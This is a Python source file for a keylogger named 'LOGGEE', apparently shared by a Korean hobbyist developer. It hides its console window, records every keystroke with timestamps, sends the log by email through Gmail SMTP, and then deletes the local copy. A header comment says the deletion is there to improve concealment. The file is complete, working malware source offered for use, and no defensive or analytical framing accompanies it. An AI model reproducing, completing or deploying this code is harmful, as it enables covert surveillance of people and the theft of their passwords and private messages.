#==================키로깅 TXT 생성 및 이메일 전송 프로그램 LOGGEE==========================
#제작자 스꾸
#깃허브 - https://github.com/ben8169
#티스토리 - https://ben8169.tistory.com/ 
# ================================================================================================================================================

#           _____           _______                   _____                    _____                    _____                    _____          
#          /\    \         /::\    \                 /\    \                  /\    \                  /\    \                  /\    \         
#         /::\____\       /::::\    \               /::\    \                /::\    \                /::\    \                /::\    \        
#        /:::/    /      /::::::\    \             /::::\    \              /::::\    \              /::::\    \              /::::\    \       
#       /:::/    /      /::::::::\    \           /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \      
#      /:::/    /      /:::/~~\:::\    \         /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \     
#     /:::/    /      /:::/    \:::\    \       /:::/  \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \    
#    /:::/    /      /:::/    / \:::\    \     /:::/    \:::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \   
#   /:::/    /      /:::/____/   \:::\____\   /:::/    / \:::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \  
#  /:::/    /      |:::|    |     |:::|    | /:::/    /   \:::\ ___\  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \ 
# /:::/____/       |:::|____|     |:::|    |/:::/____/  ___\:::|    |/:::/____/  ___\:::|    |/:::/__\:::\   \:::\____\/:::/__\:::\   \:::\____\
# \:::\    \        \:::\    \   /:::/    / \:::\    \ /\  /:::|____|\:::\    \ /\  /:::|____|\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /
#  \:::\    \        \:::\    \ /:::/    /   \:::\    /::\ \::/    /  \:::\    /::\ \::/    /  \:::\   \:::\   \/____/  \:::\   \:::\   \/____/ 
#   \:::\    \        \:::\    /:::/    /     \:::\   \:::\ \/____/    \:::\   \:::\ \/____/    \:::\   \:::\    \       \:::\   \:::\    \     
#    \:::\    \        \:::\__/:::/    /       \:::\   \:::\____\       \:::\   \:::\____\       \:::\   \:::\____\       \:::\   \:::\____\    
#     \:::\    \        \::::::::/    /         \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\   \::/    /    
#      \:::\    \        \::::::/    /           \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\   \/____/     
#       \:::\    \        \::::/    /             \::::::/    /            \::::::/    /            \:::\    \               \:::\    \         
#        \:::\____\        \::/____/               \::::/    /              \::::/    /              \:::\____\               \:::\____\        
#         \::/    /         ~~                      \::/____/                \::/____/                \::/    /                \::/    /        
#          \/____/                                                                                     \/____/                  \/____/           
                                                                                                                                      
# ================================================================================================================================================

# ____    ____  __       ___        ___   
# \   \  /   / /_ |     / _ \      / _ \  
#  \   \/   /   | |    | | | |    | | | | 
#   \      /    | |    | | | |    | | | | 
#    \    /     | |  __| |_| |  __| |_| | 
#     \__/      |_| (__)\___/  (__)\___/  
                                        
#V.1.0.0

### 1.로깅 시작-종료시간, 각 key 별 개별 입력시간 기록
### 2.각 key별 개별 log, 모든 log를 string으로 모은 concatenated log 두 가지 log 제공
### 3.concatenated log >> 백스페이스 입력시 로그도 삭제, 특수키는 \t 처리, 가독성 높임
### 4.key.left 정상종료시 자신의 gmail을 연동하여 log.txt 전송받고 로컬에서 삭제, 은폐성 향상


from pynput import keyboard
import win32console, win32gui
from datetime import datetime
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication


keylog_list = []
logtxt_path = "Choose\\Path\\To\\Be\\Saved\\" + "keylog.txt"

#키로거 창 숨기기
def hide_window():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)

#log.txt 생성
def create_log_txt(path):
    with open(path,'w') as f:
        f.write("log.txt created.")

#key.left 누를 시 logging 종료, key.backspace 누를 시 concatenated log 삭제
def on_press(key):
    global logtxt_path
    global keylog_list
    path = logtxt_path
    if key == keyboard.Key.left:
        listener.stop()
    elif key == keyboard.Key.backspace and len(keylog_list[-1]) == 3:
        try:
            keylog_list.pop()
        except:             
            None
    with open(path, 'a') as f:
        f.write(f"\n{datetime.today()} {str(key)}")
        keylog_list.append(str(key)) if not str(key) == 'Key.backspace' else None
        print(keylog_list)

#전체 logging time 측정
def recording_time(path):
    with open(path, 'a') as f:
        f.write(f"\n=======start logging from {datetime.today()}=======\n")


#Email 전송
def sending_to_email(path):
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    #google 아이디와 smtp용 google 앱 비밀번호 입력
    my_id = "Input/Yout/Gmail/Id" 
    my_password = "xxxx xxxx xxxx xxxx"         #google 앱 비밀번호 발급받아 사용, 공백 포함 16글자
    s.login(my_id, my_password)


    msg = MIMEBase('multipart','mixed')

    cont = MIMEText(f'{datetime.today()} keylog file\n ---from loggee')
    cont['Subject'] = 'loggee'
    msg.attach(cont)

    with open(path, 'rb') as f:
        attachment = MIMEApplication(f.read(), _subtype=os.path.splitext(path)[1])
        attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(path))
        msg.attach(attachment)


    receiver_id = my_id
    # receiver_id = 'Email/That@You/Want/To/Receive'
    s.sendmail(my_id, receiver_id, msg.as_string())
    s.quit()

    #log.txt 로컬에서 삭제
def delete_log_txt(path):
    if os.path.isfile(path):
        os.unlink(path)



hide_window()
create_log_txt(logtxt_path)
recording_time(logtxt_path)

listener = keyboard.Listener(on_press=on_press)
listener.start()
try:
    listener.join()
except:
    pass

#concatenated log 생성 후 마무리
with open(logtxt_path, 'a') as f:
    result = ''
    for elem in keylog_list:
        if len(elem) == 3:
            result += elem.strip("'")
        else:
            result += "\t" + elem + "\t"
    f.write(f"\n=====concatenated log until {datetime.today()}========\n{result}\n{'='*48}")

sending_to_email(logtxt_path)
delete_log_txt(logtxt_path)

